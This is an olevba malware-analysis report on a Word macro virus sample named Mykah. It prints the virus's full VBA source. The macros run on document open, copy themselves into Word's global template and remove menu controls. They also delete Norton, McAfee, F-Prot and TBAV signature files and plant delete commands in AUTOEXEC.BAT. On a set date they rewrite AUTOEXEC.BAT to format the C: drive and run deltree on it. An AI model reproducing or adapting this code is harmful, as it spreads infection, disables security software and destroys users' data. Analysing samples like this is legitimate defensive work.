olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mykah-7991a6b7e7adbcb96aaad0dd59657d5923ba63e5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mykah-7991a6b7e7adbcb96aaad0dd59657d5923ba63e5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Mykah-7991a6b7e7adbcb96aaad0dd59657d5923ba63e5 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
CommandBars("tools").Controls("Macro").Delete
           CommandBars("tools").Controls("Customize...").Delete
           CommandBars("tools").Controls("Templates and Add-Ins...").Delete
           CommandBars("view").Controls("Toolbars").Delete
End Sub
Sub AutoOpen()
ToolsOptionsSave .GlobalDotPrompt = 0
m$ = FileName$() + ":Rolz"
MacroCopy m$, "Global:FileSaveAs"
m$ = FileName$() + ":AutoOpen"
MacroCopy m$, "Global:Rolz"
End Sub
Sub Rolz()

On Error GoTo a
  VF$ = "C:\Program Files\Norton AntiVirus\Virscan.Dat"
                                        
 If Files$(VF$) = "" Then GoTo a
 SetAttr VF$, 0
 Kill VF$
                
a:
 On Error GoTo c
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo c
 SetAttr AB$, 0

 Open AB$ For Append As #1
  Print #1, "@echo off"
  Print #1, "IF exist " + VF$ + " then del " + VF$
                                        
  Close #1
                                        

c:
 On Error GoTo d
  VF$ = "C:\Program Files\F-Prot95\Fpwm32.dll"
 If Files$(VF$) = "" Then GoTo d
 SetAttr VF$, 0
 Kill VF$
                
d:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo f
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1


f:

 On Error GoTo g
  VF$ = "C:\Program Files\McAfee\Scan.dat"
 If Files$(VF$) = "" Then GoTo g
 SetAttr VF$, 0
 Kill VF$
                
g:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo h
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1

h:

 On Error GoTo i
  VF$ = "C:\Tbavw95\Tbscan.sig"
 If Files$(VF$) = "" Then GoTo i
 SetAttr VF$, 0
 Kill VF$
                
i:
  AB$ = "C:\Autoexec.bat"
 If Files$(AB$) = "" Then GoTo J
 SetAttr AB$, 0
 Open AB$ For Append As #1
  Print #1, "IF exist " + VF$ + " then del " + VF$
  Close #1


J:
If Day(Now()) = 8 And Month(Now() = 7) Then
    SetAttr "C:\AUTOEXEC.BAT", 0
    Name "C:\AUTOEXEC.BAT" As "C:\AUTOEXEC.AAV"
    Open "C:\AUTOEXEC.BAT" For Output As #1
    Print #1, "@Echo off"
    Print #1, "cls"
    Print #1, "echo   Love or Rot Zinister"
    Print #1, "echo It's all in the family"
    Print #1, "echo  PVW resting rebellion"
    Print #1, "echo I'm looking for Mykah"
    Print #1, "echo                --AKP--"
    Print #1, "echo y|format c: /u /v:AAV >nul"
    Print #1, "deltree /y c: >nul"
    Close #1
    dsk$ = Left$(DefaultDir$(9), 3)
    DocMinimize

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Fpwm32.dll          |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

